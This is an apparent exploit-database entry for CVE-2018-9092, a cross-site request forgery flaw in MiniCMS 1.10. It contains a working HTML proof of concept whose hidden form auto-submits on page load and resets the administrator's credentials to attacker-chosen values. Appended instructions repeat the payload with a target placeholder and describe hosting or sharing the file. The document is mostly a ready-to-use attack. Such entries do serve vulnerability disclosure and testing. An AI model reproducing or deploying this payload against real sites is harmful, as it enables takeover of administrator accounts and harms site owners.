<--
# Exploit Title:  MiniCMS 1.10 CSRF Vulnerability
# Date: 2018-03-28
# Exploit Author: zixian（me@zixian.org、zixian@5ecurity.cn）
# Vendor Homepage: https://github.com/bg5sbk/MiniCMS
# Software Link: https://github.com/bg5sbk/MiniCMS
# Version: 1.10
# CVE : CVE-2018-9092



There is a CSRF vulnerability that can change the administrator account password
After the administrator logged in, open the following page
 poc:
-->

 <html>
 <head><meta http-equiv="Content-Type" content="text/html; charset=GB2312">
 <title>test</title>
 <body>
 <form action="http://127.0.0.1/minicms/mc-admin/conf.php" method="post">
 <input type="hidden" name="site_name" value="hack123" />  
 <input type="hidden" name="site_desc" value="hacktest" />  
 <input type="hidden" name="site_link" value="http://127.0.0.1/minicms" />  
 <input type="hidden" name="user_nick" value="hack" />  
 <input type="hidden" name="user_name" value="admin" />  
 <input type="hidden" name="user_pass" value="hackpass" />  
 <input type="hidden" name="comment_code" value="" />  
 <input type="hidden" name="save" value=" " /> 
 </form>
 <script>
  document.forms[0].submit();
 </script>
 </body>
 </head>
 </html>


Instructions:

Prerequisites:
MiniCMS Installation:

Ensure MiniCMS version 1.10 is installed and accessible on your target server.
Administrator Access:

You need to have an administrator account logged into the MiniCMS application.

Create an HTML File: Create a new HTML file with the following content. This exploit will simulate a request that changes the administrator password.
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=GB2312">
<title>CSRF Test</title>
</head>
<body>
<form action="http://<target-ip>/minicms/mc-admin/conf.php" method="post">
  <input type="hidden" name="site_name" value="hack123" />  
  <input type="hidden" name="site_desc" value="hacktest" />  
  <input type="hidden" name="site_link" value="http://<target-ip>/minicms" />  
  <input type="hidden" name="user_nick" value="hack" />  
  <input type="hidden" name="user_name" value="admin" />  
  <input type="hidden" name="user_pass" value="hackpass" />  
  <input type="hidden" name="comment_code" value="" />  
  <input type="hidden" name="save" value=" " /> 
</form>
<script>
 document.forms[0].submit();
</script>
</body>
</html>

Replace <target-ip> with the IP address or domain of the MiniCMS server.
Save the file as csrf_exploit.html.
Host this file on a web server, or share it through a file-sharing service.

Ensure you are logged into the MiniCMS application as an administrator.

Open a browser and navigate to the URL where the csrf_exploit.html file is hosted.

The form will automatically submit once the page is loaded.

Monitor the MiniCMS application to check if the administrator account has been modified as specified in the exploit.

Try logging into MiniCMS with the new credentials.

Verify if the application settings or administrator profile have been updated according to the exploit's data.


